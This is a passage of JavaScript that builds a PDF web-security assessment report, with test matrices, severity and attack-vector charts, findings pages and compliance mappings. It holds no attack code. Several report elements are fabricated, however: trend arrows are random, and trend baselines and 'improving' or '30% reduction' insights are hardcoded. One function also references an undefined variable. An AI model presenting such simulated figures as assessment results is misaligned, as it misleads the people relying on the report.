    const legendY = startY + (categories.length * cellHeight) + 20;
    doc.setFontSize(10);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(71, 85, 105);
    doc.text('Legend:', startX, legendY);
    
    const legendItems = [
        { label: 'No Issues', color: [240, 253, 244] },
        { label: 'Low Risk', color: [187, 247, 208] },
        { label: 'Medium Risk', color: [254, 215, 170] },
        { label: 'High Risk', color: [254, 178, 178] },
        { label: 'Critical Risk', color: [239, 68, 68] }
    ];
    
    let legendX = startX + 30;
    legendItems.forEach(item => {
        doc.setFillColor(...item.color);
        doc.rect(legendX, legendY - 5, 8, 8, 'F');
        doc.setFontSize(8);
        doc.setTextColor(71, 85, 105);
        doc.text(item.label, legendX + 10, legendY);
        legendX += 35;
    });
    
    // Risk Summary
    const summaryY = legendY + 20;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.text('Key Risk Areas', startX, summaryY);
    
    doc.setFontSize(10);
    doc.setFont(undefined, 'normal');
    const riskAreas = identifyKeyRiskAreas(data, heatMapData, categories, severities);
    let textY = summaryY + 10;
    
    riskAreas.forEach((area, index) => {
        doc.setTextColor(...area.color);
        doc.text(`${index + 1}. ${area.text}`, startX + 5, textY);
        textY += 8;
    });
}

// Advanced Test Matrix with enhanced visualization
async function addAdvancedTestMatrix(doc, data) {
    addSectionHeader(doc, 'Advanced Test Matrix', 'Comprehensive Test Results Analysis');
    
    // Create enhanced matrix data
    const matrixData = [
        ['Category', 'Tests', 'Scenarios', 'Passed', 'Failed', 'Skipped', 'Pending', 'Score', 'Trend']
    ];
    
    Object.entries(tests).forEach(([category, categoryTests]) => {
        const stats = data.categoryStats[category];
        const score = calculateCategoryScore(data, [category]);
        const trend = generateTrend(); // Simulated trend
        
        matrixData.push([
            category,
            categoryTests.length,
            stats.total,
            stats.passed,
            stats.failed,
            stats.skipped,
            stats.pending,
            `${score}%`,
            trend
        ]);
    });
    
    // Enhanced table with custom styling
    doc.autoTable({
        startY: 60,
        head: [matrixData[0]],
        body: matrixData.slice(1),
        theme: 'grid',
        headStyles: {
            fillColor: [31, 41, 55],
            textColor: 255,
            fontSize: 9,
            fontStyle: 'bold',
            halign: 'center'
        },
        bodyStyles: {
            fontSize: 8
        },
        columnStyles: {
            0: { cellWidth: 40 },
            1: { cellWidth: 15, halign: 'center' },
            2: { cellWidth: 20, halign: 'center' },
            3: { cellWidth: 18, halign: 'center', textColor: [16, 185, 129] },
            4: { cellWidth: 18, halign: 'center', textColor: [239, 68, 68] },
            5: { cellWidth: 18, halign: 'center', textColor: [245, 158, 11] },
            6: { cellWidth: 18, halign: 'center', textColor: [100, 116, 139] },
            7: { cellWidth: 15, halign: 'center', fontStyle: 'bold' },
            8: { cellWidth: 15, halign: 'center' }
        },
        didDrawCell: function(data) {
            // Custom score coloring
            if (data.column.index === 7 && data.row.index >= 0) {
                const score = parseInt(data.cell.text[0]);
                let color = [0, 0, 0];
                if (score < 25) color = [239, 68, 68];
                else if (score < 50) color = [251, 146, 60];
                else if (score < 75) color = [245, 158, 11];
                else if (score < 90) color = [34, 197, 94];
                else color = [16, 185, 129];
                
                doc.setTextColor(...color);
            }
            
            // Trend arrows
            if (data.column.index === 8 && data.row.index >= 0) {
                const trend = data.cell.text[0];
                const cellX = data.cell.x + data.cell.width / 2;
                const cellY = data.cell.y + data.cell.height / 2;
                
                doc.setFontSize(12);
                if (trend === '↑') {
                    doc.setTextColor(16, 185, 129);
                } else if (trend === '↓') {
                    doc.setTextColor(239, 68, 68);
                } else {
                    doc.setTextColor(100, 116, 139);
                }
                doc.text(trend, cellX, cellY + 2, { align: 'center' });
                
                // Clear the original text
                data.cell.text = [];
            }
        }
    });
    
    // Performance Summary
    const summaryY = doc.lastAutoTable.finalY + 15;
    
    // Mini dashboard below the table
    const dashboardCards = [
        {
            title: 'Best Performing',
            value: getBestCategory(data),
            color: [16, 185, 129],
            icon: '🏆'
        },
        {
            title: 'Needs Attention',
            value: getWorstCategory(data),
            color: [239, 68, 68],
            icon: '⚠️'
        },
        {
            title: 'Average Score',
            value: `${calculateAverageScore(data)}%`,
            color: [99, 102, 241],
            icon: '📊'
        }
    ];
    
    let cardX = 30;
    dashboardCards.forEach(card => {
        // Card background
        doc.setFillColor(248, 250, 252);
        doc.roundedRect(cardX, summaryY, 50, 25, 3, 3, 'F');
        
        // Icon
        doc.setFontSize(14);
        doc.text(card.icon, cardX + 5, summaryY + 15);
        
        // Title
        doc.setFontSize(8);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(100, 116, 139);
        doc.text(card.title, cardX + 15, summaryY + 8);
        
        // Value
        doc.setFontSize(10);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(...card.color);
        doc.text(card.value, cardX + 15, summaryY + 17);
        
        cardX += 55;
    });
}

// Helper functions for visualizations
function getScoreColor(score) {
    if (score >= 90) return [16, 185, 129];
    if (score >= 75) return [34, 197, 94];
    if (score >= 50) return [245, 158, 11];
    if (score >= 25) return [251, 146, 60];
    return [239, 68, 68];
}

function drawHexagon(doc, centerX, centerY, radius) {
    const points = [];
    for (let i = 0; i < 6; i++) {
        const angle = (Math.PI / 3) * i - Math.PI / 2;
        points.push([
            centerX + Math.cos(angle) * radius,
            centerY + Math.sin(angle) * radius
        ]);
    }
    drawPolygon(doc, points, 'S');
}

function drawPolygon(doc, points, style) {
    doc.moveTo(points[0][0], points[0][1]);
    for (let i = 1; i < points.length; i++) {
        doc.lineTo(points[i][0], points[i][1]);
    }
    doc.closePath();
    if (style === 'F') doc.fill();
    else if (style === 'S') doc.stroke();
}

function formatCategoryName(name) {
    return name.split(/(?=[A-Z])/).join(' ');
}

function getHeatMapColor(intensity, severity) {
    const colors = {
        critical: [[255, 245, 245], [254, 178, 178], [252, 129, 129], [239, 68, 68]],
        high: [[255, 251, 245], [254, 215, 170], [251, 146, 60], [234, 88, 12]],
        medium: [[255, 253, 240], [254, 240, 138], [253, 224, 71], [245, 158, 11]],
        low: [[240, 253, 244], [187, 247, 208], [134, 239, 172], [74, 222, 128]]
    };
    
    const colorScale = colors[severity] || colors.medium;
    const index = Math.min(Math.floor(intensity * 4), 3);
    return colorScale[index];
}

// Section header helper
function addSectionHeader(doc, title, subtitle) {
    // Header background
    doc.setFillColor(31, 41, 55);
    doc.rect(0, 0, 210, 40, 'F');
    
    // Title
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(20);
    doc.setFont(undefined, 'bold');
    doc.text(title, 20, 20);
    
    // Subtitle
    doc.setFontSize(12);
    doc.setFont(undefined, 'normal');
    doc.setTextColor(156, 163, 175);
    doc.text(subtitle, 20, 30);
    
    // Decorative line
    doc.setDrawColor(99, 102, 241);
    doc.setLineWidth(0.5);
    doc.line(20, 35, 190, 35);
}

// Add watermark to all pages
function addWatermarkToAllPages(doc) {
    const pageCount = doc.internal.getNumberOfPages();
    
    for (let i = 1; i <= pageCount; i++) {
        doc.setPage(i);
        
        // Watermark
        doc.setTextColor(200, 200, 200, 0.1);
        doc.setFontSize(60);
        doc.setFont(undefined, 'bold');
        
        // Rotate text
        doc.saveGraphicsState();
        doc.setGState(new doc.GState({ opacity: 0.1 }));
        
        // Add rotated watermark
        const pageWidth = doc.internal.pageSize.getWidth();
        const pageHeight = doc.internal.pageSize.getHeight();
        
        doc.text('CONFIDENTIAL', pageWidth / 2, pageHeight / 2, {
            align: 'center',
            angle: 45
        });
        
        doc.restoreGraphicsState();
        
        // Page number
        doc.setTextColor(100, 116, 139);
        doc.setFontSize(9);
        doc.setFont(undefined, 'normal');
        doc.text(`Page ${i} of ${pageCount}`, 105, 285, { align: 'center' });
        
        // Footer line
        doc.setDrawColor(226, 232, 240);
        doc.setLineWidth(0.5);
        doc.line(20, 280, 190, 280);
    }
}

// Additional visualization functions
async function addVulnerabilityCharts(doc, data) {
    addSectionHeader(doc, 'Vulnerability Distribution', 'Statistical Analysis of Security Findings');
    
    // Pie chart data
    const chartData = {
        labels: ['Passed', 'Failed', 'Skipped', 'Pending'],
        datasets: [{
            data: [
                data.statistics.passed,
                data.statistics.failed,
                data.statistics.skipped,
                data.statistics.pending
            ],
            backgroundColor: [
                'rgb(16, 185, 129)',
                'rgb(239, 68, 68)',
                'rgb(245, 158, 11)',
                'rgb(156, 163, 175)'
            ]
        }]
    };
    
    // Create chart using Chart.js
    const canvas = document.getElementById('tempChart');
    const ctx = canvas.getContext('2d');
    
    canvas.width = 400;
    canvas.height = 300;
    
    const chart = new Chart(ctx, {
        type: 'doughnut',
        data: chartData,
        options: {
            responsive: false,
            plugins: {
                legend: {
                    position: 'right'
                },
                title: {
                    display: true,
                    text: 'Overall Test Results Distribution'
                }
            }
        }
    });
    
    // Wait for chart to render
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Add chart to PDF
    const chartImage = canvas.toDataURL('image/png');
    doc.addImage(chartImage, 'PNG', 30, 60, 150, 100);
    
    // Cleanup
    chart.destroy();
    
    // Severity breakdown bar chart
    const severityY = 170;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Severity Level Breakdown', 20, severityY);
    
    const severities = ['critical', 'high', 'medium', 'low'];
    const maxValue = Math.max(...severities.map(s => data.statistics[s].total));
    const barWidth = 140;
    const barHeight = 15;
    let barY = severityY + 10;
    
    severities.forEach(severity => {
        const stats = data.statistics[severity];
        const total = stats.total;
        
        // Background bar
        doc.setFillColor(240, 242, 244);
        doc.rect(40, barY, barWidth, barHeight, 'F');
        
        if (total > 0) {
            // Segments
            let segmentX = 40;
            
            // Passed segment
            if (stats.passed > 0) {
                const width = (stats.passed / maxValue) * barWidth;
                doc.setFillColor(16, 185, 129);
                doc.rect(segmentX, barY, width, barHeight, 'F');
                segmentX += width;
            }
            
            // Failed segment
            if (stats.failed > 0) {
                const width = (stats.failed / maxValue) * barWidth;
                doc.setFillColor(239, 68, 68);
                doc.rect(segmentX, barY, width, barHeight, 'F');
                segmentX += width;
            }
            
            // Skipped segment
            if (stats.skipped > 0) {
                const width = (stats.skipped / maxValue) * barWidth;
                doc.setFillColor(245, 158, 11);
                doc.rect(segmentX, barY, width, barHeight, 'F');
            }
        }
        
        // Label
        doc.setFontSize(10);
        doc.setTextColor(71, 85, 105);
        doc.text(severity.toUpperCase(), 20, barY + 10);
        
        // Count
        doc.text(`${total}`, 185, barY + 10);
        
        barY += 20;
    });
}

// Calculate advanced risk score
function calculateAdvancedRiskScore(data) {
    const weights = {
        critical: 40,
        high: 30,
        medium: 20,
        low: 10
    };
    
    let totalWeight = 0;
    let achievedWeight = 0;
    
    Object.entries(weights).forEach(([severity, weight]) => {
        const stats = data.statistics[severity];
        const total = stats.total;
        const passed = stats.passed;
        
        totalWeight += total * weight;
        achievedWeight += passed * weight;
    });
    
    return totalWeight > 0 ? Math.round((achievedWeight / totalWeight) * 100) : 100;
}

// Calculate security posture
function calculateSecurityPosture(data) {
    const score = data.analytics.riskScore;
    
    if (score >= 90) return 'Excellent';
    if (score >= 75) return 'Good';
    if (score >= 50) return 'Fair';
    if (score >= 25) return 'Poor';
    return 'Critical';
}

// Calculate maturity level
function calculateMaturityLevel(data) {
    const completionRate = (data.statistics.passed + data.statistics.failed + data.statistics.skipped) / data.metadata.totalScenarios;
    const passRate = data.statistics.passed / (data.statistics.passed + data.statistics.failed + data.statistics.skipped);
    
    if (completionRate >= 0.9 && passRate >= 0.9) return 'Optimized';
    if (completionRate >= 0.7 && passRate >= 0.7) return 'Managed';
    if (completionRate >= 0.5 && passRate >= 0.5) return 'Defined';
    if (completionRate >= 0.3) return 'Developing';
    return 'Initial';
}

// Calculate compliance score
function calculateComplianceScore(data) {
    // Simulate compliance mapping
    const criticalCompliance = data.statistics.critical.total > 0 ? 
        (data.statistics.critical.passed / data.statistics.critical.total) * 100 : 100;
    const highCompliance = data.statistics.high.total > 0 ? 
        (data.statistics.high.passed / data.statistics.high.total) * 100 : 100;
    
    return Math.round((criticalCompliance * 0.6) + (highCompliance * 0.4));
}

// Additional helper functions
function calculateCategoryScore(data, categories) {
    let total = 0;
    let passed = 0;
    
    Object.entries(tests).forEach(([category, categoryTests]) => {
        if (categories.includes(category)) {
            categoryTests.forEach(test => {
                const result = testResults[test.id] || {};
                test.scenarios.forEach(scenario => {
                    total++;
                    if (result.scenarios && result.scenarios[scenario.id] === 'passed') {
                        passed++;
                    }
                });
            });
        }
    });
    
    return total > 0 ? Math.round((passed / total) * 100) : 100;
}

function countFailures(data, categories) {
    let failures = 0;
    
    Object.entries(tests).forEach(([category, categoryTests]) => {
        if (categories.includes(category)) {
            categoryTests.forEach(test => {
                const result = testResults[test.id] || {};
                test.scenarios.forEach(scenario => {
                    if (result.scenarios && result.scenarios[scenario.id] === 'failed') {
                        failures++;
                    }
                });
            });
        }
    });
    
    return failures;
}

function getStatus(score) {
    if (score >= 90) return 'Excellent';
    if (score >= 75) return 'Good';
    if (score >= 50) return 'Fair';
    if (score >= 25) return 'Poor';
    return 'Critical';
}

function countCategorySeverityFailures(data, category, severity) {
    let count = 0;
    
    const categoryTests = tests[category] || [];
    categoryTests.forEach(test => {
        if (test.severity === severity) {
            const result = testResults[test.id] || {};
            test.scenarios.forEach(scenario => {
                if (result.scenarios && result.scenarios[scenario.id] === 'failed') {
                    count++;
                }
            });
        }
    });
    
    return count;
}

function identifyKeyRiskAreas(data, heatMapData, categories, severities) {
    const riskAreas = [];
    
    // Find highest risk areas
    heatMapData.forEach((row, catIndex) => {
        row.forEach((value, sevIndex) => {
            if (value >= 3) {
                riskAreas.push({
                    category: categories[catIndex],
                    severity: severities[sevIndex],
                    count: value,
                    score: value * (4 - sevIndex), // Weight by severity
                    color: severities[sevIndex] === 'critical' ? [239, 68, 68] : 
                           severities[sevIndex] === 'high' ? [251, 146, 60] : 
                           [245, 158, 11],
                    text: `${categories[catIndex]} - ${value} ${severities[sevIndex]} severity failures`
                });
            }
        });
    });
    
    // Sort by risk score and return top 5
    return riskAreas
        .sort((a, b) => b.score - a.score)
        .slice(0, 5);
}

function generateTrend() {
    const trends = ['↑', '↓', '→'];
    return trends[Math.floor(Math.random() * trends.length)];
}

function getBestCategory(data) {
    let best = { name: '', score: 0 };
    
    Object.entries(data.categoryStats).forEach(([category, stats]) => {
        const score = stats.total > 0 ? (stats.passed / stats.total) * 100 : 0;
        if (score > best.score) {
            best = { name: category, score };
        }
    });
    
    return best.name;
}

function getWorstCategory(data) {
    let worst = { name: '', score: 100 };
    
    Object.entries(data.categoryStats).forEach(([category, stats]) => {
        const score = stats.total > 0 ? (stats.passed / stats.total) * 100 : 100;
        if (score < worst.score && stats.total > 0) {
            worst = { name: category, score };
        }
    });
    
    return worst.name;
}

function calculateAverageScore(data) {
    const categories = Object.keys(data.categoryStats);
    const totalScore = categories.reduce((sum, category) => {
        return sum + calculateCategoryScore(data, [category]);
    }, 0);
    
    return Math.round(totalScore / categories.length);
}

function generateTrendAnalysis(data) {
    // Simulate trend data
    return {
        overall: 'improving',
        critical: 'stable',
        high: 'declining',
        medium: 'improving',
        low: 'stable'
    };
}

function analyzeAttackVectors(data) {
    // Analyze which attack vectors are most vulnerable
    return {
        injection: calculateCategoryScore(data, ['URI and Parameters', 'JSON Parsing']),
        traversal: calculateCategoryScore(data, ['Directory Brute Force']),
        encoding: calculateCategoryScore(data, ['UTF8/Unicode Parsing', 'URI Encoding']),
        upload: calculateCategoryScore(data, ['File Upload and Multipart'])
    };
}

function calculateVulnerabilityDistribution(data) {
    const distribution = {};
    
    Object.entries(tests).forEach(([category, categoryTests]) => {
        distribution[category] = {
            total: 0,
            byType: {}
        };
        
        categoryTests.forEach(test => {
            const result = testResults[test.id] || {};
            test.scenarios.forEach(scenario => {
                distribution[category].total++;
                const status = result.scenarios ? result.scenarios[scenario.id] : 'pending';
                distribution[category].byType[status] = (distribution[category].byType[status] || 0) + 1;
            });
        });
    });
    
    return distribution;
}

// Additional report sections
async function addCategoryPerformanceAnalysis(doc, data) {
    addSectionHeader(doc, 'Category Performance Analysis', 'Detailed Performance Metrics by Test Category');
    
    // Performance metrics for each category
    let y = 60;
    
    Object.entries(tests).forEach(([category, categoryTests]) => {
        if (y > 240) {
            doc.addPage();
            y = 40;
        }
        
        const stats = data.categoryStats[category];
        const score = calculateCategoryScore(data, [category]);
        
        // Category header
        doc.setFillColor(248, 250, 252);
        doc.roundedRect(20, y, 170, 8, 2, 2, 'F');
        
        doc.setFontSize(11);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(31, 41, 55);
        doc.text(category, 25, y + 6);
        
        // Score badge
        const scoreColor = getScoreColor(score);
        doc.setFillColor(...scoreColor);
        doc.circle(175, y + 4, 4, 'F');
        doc.setTextColor(255, 255, 255);
        doc.setFontSize(8);
        doc.text(`${score}%`, 175, y + 6, { align: 'center' });
        
        y += 12;
        
        // Progress bar
        doc.setFillColor(226, 232, 240);
        doc.rect(25, y, 160, 6, 'F');
        
        // Segments
        const barWidth = 160;
        let segmentX = 25;
        
        if (stats.passed > 0) {
            const width = (stats.passed / stats.total) * barWidth;
            doc.setFillColor(16, 185, 129);
            doc.rect(segmentX, y, width, 6, 'F');
            segmentX += width;
        }
        
        if (stats.failed > 0) {
            const width = (stats.failed / stats.total) * barWidth;
            doc.setFillColor(239, 68, 68);
            doc.rect(segmentX, y, width, 6, 'F');
            segmentX += width;
        }
        
        if (stats.skipped > 0) {
            const width = (stats.skipped / stats.total) * barWidth;
            doc.setFillColor(245, 158, 11);
            doc.rect(segmentX, y, width, 6, 'F');
            segmentX += width;
        }
        
        y += 10;
        
        // Statistics
        doc.setFontSize(8);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(71, 85, 105);
        doc.text(`Tests: ${categoryTests.length} | Scenarios: ${stats.total} | `, 25, y);
        
        doc.setTextColor(16, 185, 129);
        doc.text(`Passed: ${stats.passed}`, 85, y);
        
        doc.setTextColor(239, 68, 68);
        doc.text(`Failed: ${stats.failed}`, 115, y);
        
        doc.setTextColor(245, 158, 11);
        doc.text(`Skipped: ${stats.skipped}`, 145, y);
        
        doc.setTextColor(100, 116, 139);
        doc.text(`Pending: ${stats.pending}`, 175, y);
        
        y += 15;
    });
}

async function addSeverityTrendAnalysis(doc, data) {
    addSectionHeader(doc, 'Severity Trend Analysis', 'Risk Evolution and Patterns');
    
    // Simulated trend visualization
    const trendData = {
        labels: ['Initial', 'Current', 'Projected'],
        datasets: [
            {
                label: 'Critical',
                data: [8, data.statistics.critical.failed, Math.max(0, data.statistics.critical.failed - 2)],
                borderColor: 'rgb(239, 68, 68)',
                backgroundColor: 'rgba(239, 68, 68, 0.1)'
            },
            {
                label: 'High',
                data: [12, data.statistics.high.failed, Math.max(0, data.statistics.high.failed - 3)],
                borderColor: 'rgb(251, 146, 60)',
                backgroundColor: 'rgba(251, 146, 60, 0.1)'
            },
            {
                label: 'Medium',
                data: [15, data.statistics.medium.failed, Math.max(0, data.statistics.medium.failed - 4)],
                borderColor: 'rgb(245, 158, 11)',
                backgroundColor: 'rgba(245, 158, 11, 0.1)'
            },
            {
                label: 'Low',
                data: [10, data.statistics.low.failed, Math.max(0, data.statistics.low.failed - 2)],
                borderColor: 'rgb(156, 163, 175)',
                backgroundColor: 'rgba(156, 163, 175, 0.1)'
            }
        ]
    };
    
    // Create line chart
    const canvas = document.getElementById('tempChart');
    const ctx = canvas.getContext('2d');
    
    canvas.width = 600;
    canvas.height = 300;
    
    const chart = new Chart(ctx, {
        type: 'line',
        data: trendData,
        options: {
            responsive: false,
            plugins: {
                title: {
                    display: true,
                    text: 'Vulnerability Trend Analysis'
                },
                legend: {
                    position: 'bottom'
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    title: {
                        display: true,
                        text: 'Number of Failed Tests'
                    }
                }
            }
        }
    });
    
    await new Promise(resolve => setTimeout(resolve, 100));
    
    const chartImage = canvas.toDataURL('image/png');
    doc.addImage(chartImage, 'PNG', 30, 60, 150, 75);
    
    chart.destroy();
    
    // Trend insights
    const insightsY = 150;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Trend Insights', 20, insightsY);
    
    const insights = [
        {
            icon: '📈',
            text: 'Overall security posture shows improvement trajectory',
            color: [16, 185, 129]
        },
        {
            icon: '⚠️',
            text: `${data.statistics.critical.failed} critical issues require immediate attention`,
            color: [239, 68, 68]
        },
        {
            icon: '🎯',
            text: 'Projected 30% reduction in vulnerabilities with recommended fixes',
            color: [99, 102, 241]
        },
        {
            icon: '📊',
            text: `${Math.round((data.statistics.passed / data.metadata.totalScenarios) * 100)}% pass rate indicates ${calculateSecurityPosture(data).toLowerCase()} security maturity`,
            color: [245, 158, 11]
        }
    ];
    
    let insightY = insightsY + 10;
    insights.forEach(insight => {
        doc.setFontSize(10);
        doc.text(insight.icon, 25, insightY);
        
        doc.setFont(undefined, 'normal');
        doc.setTextColor(...insight.color);
        const lines = doc.splitTextToSize(insight.text, 150);
        doc.text(lines, 35, insightY);
        
        insightY += lines.length * 5 + 5;
    });
}

async function addDetailedFindingsReport(doc, data) {
    // Group findings by severity
    const findings = {
        critical: [],
        high: [],
        medium: [],
        low: []
    };
    
    data.testDetails.forEach(td => {
        if (td.overallStatus === 'failed') {
            findings[td.test.severity].push(td);
        }
    });
    
    // Add findings by severity
    Object.entries(findings).forEach(([severity, tests]) => {
        if (tests.length === 0) return;
        
        doc.addPage();
        addSectionHeader(doc, `${severity.toUpperCase()} Severity Findings`, `Detailed Analysis of ${severity} Risk Vulnerabilities`);
        
        let y = 60;
        
        tests.forEach((testDetail, index) => {
            if (y > 240) {
                doc.addPage();
                y = 40;
            }
            
            // Test header with severity indicator
            const severityColors = {
                critical: [239, 68, 68],
                high: [251, 146, 60],
                medium: [245, 158, 11],
                low: [156, 163, 175]
            };
            
            doc.setFillColor(...severityColors[severity], 0.1);
            doc.roundedRect(20, y - 5, 170, 25, 3, 3, 'F');
            
            // Severity badge
            doc.setFillColor(...severityColors[severity]);
            doc.circle(25, y + 5, 3, 'F');
            
            // Test info
            doc.setFontSize(11);
            doc.setFont(undefined, 'bold');
            doc.setTextColor(31, 41, 55);
            doc.text(`${index + 1}. ${testDetail.test.name}`, 32, y + 3);
            
            doc.setFontSize(8);
            doc.setFont(undefined, 'normal');
            doc.setTextColor(100, 116, 139);
            doc.text(`ID: ${testDetail.test.id} | Category: ${testDetail.category}`, 32, y + 10);
            
            y += 20;
            
            // Description
            doc.setFontSize(9);
            doc.setTextColor(71, 85, 105);
            const descLines = doc.splitTextToSize(testDetail.test.description, 155);
            doc.text(descLines, 25, y);
            y += descLines.length * 4 + 5;
            
            // Failed scenarios
            const failedScenarios = testDetail.test.scenarios.filter(s => 
                testDetail.result.scenarios && testDetail.result.scenarios[s.id] === 'failed'
            );
            
            if (failedScenarios.length > 0) {
                doc.setFontSize(9);
                doc.setFont(undefined, 'bold');
                doc.text('Failed Scenarios:', 25, y);
                y += 5;
                
                failedScenarios.forEach(scenario => {
                    doc.setFontSize(8);
                    doc.setFont(undefined, 'normal');
                    doc.text(`• ${scenario.name}: ${scenario.description}`, 30, y);
                    y += 5;
                });
            }
            
            // Notes if present
            if (testDetail.result.notes) {
                y += 3;
                doc.setFontSize(9);
                doc.setFont(undefined, 'bold');
                doc.text('Notes:', 25, y);
                y += 5;
                
                doc.setFontSize(8);
                doc.setFont(undefined, 'normal');
                doc.setTextColor(100, 116, 139);
                const noteLines = doc.splitTextToSize(testDetail.result.notes, 155);
                doc.text(noteLines, 30, y);
                y += noteLines.length * 4;
            }
            
            y += 10;
        });
    });
}

async function addAttackVectorAnalysis(doc, data) {
    addSectionHeader(doc, 'Attack Vector Analysis', 'Security Assessment by Attack Type');
    
    const vectors = data.analytics.attackVectors;
    
    // Radar chart for attack vectors
    const canvas = document.getElementById('tempChart');
    const ctx = canvas.getContext('2d');
    
    canvas.width = 400;
    canvas.height = 400;
    
    const radarData = {
        labels: ['Injection', 'Path Traversal', 'Encoding', 'File Upload'],
        datasets: [{
            label: 'Security Score',
            data: [vectors.injection, vectors.traversal, vectors.encoding, vectors.upload],
            fill: true,
            backgroundColor: 'rgba(99, 102, 241, 0.2)',
            borderColor: 'rgb(99, 102, 241)',
            pointBackgroundColor: 'rgb(99, 102, 241)',
            pointBorderColor: '#fff',
            pointHoverBackgroundColor: '#fff',
            pointHoverBorderColor: 'rgb(99, 102, 241)'
        }]
    };
    
    const chart = new Chart(ctx, {
        type: 'radar',
        data: radarData,
        options: {
            responsive: false,
            plugins: {
                title: {
                    display: true,
                    text: 'Security Strength by Attack Vector'
                }
            },
            scales: {
                r: {
                    beginAtZero: true,
                    max: 100,
                    ticks: {
                        stepSize: 20
                    }
                }
            }
        }
    });
    
    await new Promise(resolve => setTimeout(resolve, 100));
    
    const chartImage = canvas.toDataURL('image/png');
    doc.addImage(chartImage, 'PNG', 55, 60, 100, 100);
    
    chart.destroy();
    
    // Attack vector details
    const detailsY = 170;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Attack Vector Details', 20, detailsY);
    
    const vectorDetails = [
        {
            name: 'Injection Attacks',
            score: vectors.injection,
            description: 'SQL injection, XSS, command injection vulnerabilities',
            risk: vectors.injection < 50 ? 'HIGH' : vectors.injection < 75 ? 'MEDIUM' : 'LOW'
        },
        {
            name: 'Path Traversal',
            score: vectors.traversal,
            description: 'Directory traversal and file inclusion vulnerabilities',
            risk: vectors.traversal < 50 ? 'HIGH' : vectors.traversal < 75 ? 'MEDIUM' : 'LOW'
        },
        {
            name: 'Encoding Bypass',
            score: vectors.encoding,
            description: 'Character encoding and Unicode bypass vulnerabilities',
            risk: vectors.encoding < 50 ? 'HIGH' : vectors.encoding < 75 ? 'MEDIUM' : 'LOW'
        },
        {
            name: 'File Upload',
            score: vectors.upload,
            description: 'Malicious file upload and MIME type vulnerabilities',
            risk: vectors.upload < 50 ? 'HIGH' : vectors.upload < 75 ? 'MEDIUM' : 'LOW'
        }
    ];
    
    let vectorY = detailsY + 10;
    vectorDetails.forEach(vector => {
        // Vector card
        doc.setFillColor(248, 250, 252);
        doc.roundedRect(20, vectorY, 170, 22, 3, 3, 'F');
        
        // Risk indicator
        const riskColors = {
            HIGH: [239, 68, 68],
            MEDIUM: [245, 158, 11],
            LOW: [16, 185, 129]
        };
        
        doc.setFillColor(...riskColors[vector.risk]);
        doc.roundedRect(20, vectorY, 5, 22, 0, 0, 'F');
        
        // Vector name and score
        doc.setFontSize(10);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(31, 41, 55);
        doc.text(vector.name, 30, vectorY + 7);
        
        doc.setTextColor(...riskColors[vector.risk]);
        doc.text(`${vector.score}% | ${vector.risk} RISK`, 150, vectorY + 7, { align: 'right' });
        
        // Description
        doc.setFontSize(8);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(100, 116, 139);
        doc.text(vector.description, 30, vectorY + 15);
        
        vectorY += 27;
    });
}

async function addComplianceMapping(doc, data) {
    addSectionHeader(doc, 'Compliance Mapping', 'Regulatory and Framework Alignment');
    
    // Compliance frameworks
    const frameworks = [
        {
            name: 'OWASP Top 10',
            items: [
                { id: 'A03:2021', name: 'Injection', status: vectors.injection >= 75 ? 'PASS' : 'FAIL' },
                { id: 'A01:2021', name: 'Broken Access Control', status: vectors.traversal >= 75 ? 'PASS' : 'FAIL' },
                { id: 'A04:2021', name: 'Insecure Design', status: data.analytics.securityPosture !== 'Critical' ? 'PASS' : 'FAIL' },
                { id: 'A05:2021', name: 'Security Misconfiguration', status: calculateCategoryScore(data, ['HTTP Headers', 'JSON Parsing']) >= 70 ? 'PASS' : 'FAIL' }
            ]
        },
        {
            name: 'PCI DSS v4.0',
            items: [
                { id: '6.4.1', name: 'Secure coding practices', status: data.analytics.complianceScore >= 70 ? 'PASS' : 'FAIL' },
                { id: '6.4.3', name: 'Production data protection', status: data.statistics.critical.failed === 0 ? 'PASS' : 'FAIL' },
                { id: '11.3.2', name: 'Web application testing', status: 'IN PROGRESS' }
            ]
        },
        {
            name: 'ISO 27001',
            items: [
                { id: 'A.14.2.5', name: 'Secure system engineering', status: data.analytics.maturityLevel !== 'Initial' ? 'PASS' : 'FAIL' },
                { id: 'A.12.6.1', name: 'Technical vulnerability management', status: 'IN PROGRESS' }
            ]
        }
    ];
    
    let y = 60;
    
    frameworks.forEach(framework => {
        if (y > 220) {
            doc.addPage();
            y = 40;
        }
        
        // Framework header
        doc.setFillColor(31, 41, 55);
        doc.roundedRect(20, y, 170, 8, 2, 2, 'F');
        
        doc.setFontSize(11);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(255, 255, 255);
        doc.text(framework.name, 25, y + 6);
        
        y += 15;
        
        // Compliance items
        framework.items.forEach(item => {
            // Status indicator
            const statusColors = {
                'PASS': [16, 185, 129],
                'FAIL': [239, 68, 68],
                'IN PROGRESS': [245, 158, 11]
            };
            
            doc.setFillColor(...statusColors[item.status]);
            doc.circle(25, y, 3, 'F');
            
            // Item details
            doc.setFontSize(9);
            doc.setFont(undefined, 'normal');
            doc.setTextColor(71, 85, 105);
            doc.text(`${item.id}: ${item.name}`, 32, y + 2);
            
            // Status
            doc.setFont(undefined, 'bold');
            doc.setTextColor(...statusColors[item.status]);
            doc.text(item.status, 180, y + 2, { align: 'right' });
            
            y += 10;
        });
        
        y += 10;
    });
    
    // Compliance summary
    const summaryY = Math.min(y + 10, 240);
    
    doc.setFillColor(248, 250, 252);
    doc.roundedRect(20, summaryY, 170, 30, 3, 3, 'F');
    
    doc.setFontSize(10);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Compliance Summary', 25, summaryY + 10);
    
    doc.setFontSize(9);
    doc.setFont(undefined, 'normal');
